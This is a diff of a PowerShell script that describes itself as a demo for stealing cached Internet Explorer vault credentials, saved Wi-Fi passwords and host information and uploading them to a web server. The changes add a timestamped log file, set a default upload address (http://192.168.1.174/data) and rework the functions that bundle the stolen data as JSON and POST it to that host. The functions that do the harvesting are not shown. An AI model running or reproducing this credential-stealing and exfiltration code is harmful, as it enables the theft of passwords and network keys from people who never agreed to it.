@@ -3,7 +3,7 @@
 Demo to get cached credentials, wifi and upload to webserver
 .DESCRIPTION
 Performs the following task
-    - Get credentilas from IE vault
+    - Get credentials from IE vault
     - Get saved wifi passwords
     - Get host information
     - Upload to webserver
@@ -42,14 +42,17 @@ Param(
 $ErrorActionPreference = "Continue"
 $Error.count
 #New-Item Errors.log -type file
-$date = (Get-Date).ToString('yyyy-MM-dd')
+$date = (Get-Date).ToString('yyyy-MM-dd_HHmm')
+
+#for demo
+$output = "C:\temp\" + "$date" + "out.log"
+$url = "http://192.168.1.174/data"
 
 #demo
 if ($demo -eq "demo") {
     $output = "C:\temp\out"
     $url = "http://192.168.1.174/data"
 }
-
 
 
 function Getcreds {
@@ -104,33 +107,28 @@ $sessions
 $env:HostIP
 }
 
-function body {
+
+function upload([string]$url){
+Invoke-RestMethod -Method 'POST' -Uri "$url" -Body $Body
+}
+
+function log($Body) {
+Add-Content -Path $output -Value $Body
+Get-Content -Path $output | ConvertFrom-Json
+}
+
 $Body = @{
     cred=Getcreds
     wifi=Getwifi
     sysinfo=sysinfo
     users=$user
     ip=$env:HostIP
-}
+    }
 $Body = $Body | ConvertTo-Json
 $Object = ConvertFrom-Json –InputObject $Body
-}
-
-function upload($url) {
-
-Invoke-RestMethod -Method 'POST' -Uri $url -Body $Object
-}
-
-function log {
-$output = $output  + $date + ".log"
-Add-Content -Path $output -Value $Object
-Get-Content -Path $output | ConvertFrom-Json
-}
-
 
 ###Run
-body
-log
+log($Body)
 if ($url -ne "") {
 upload($url)
 }
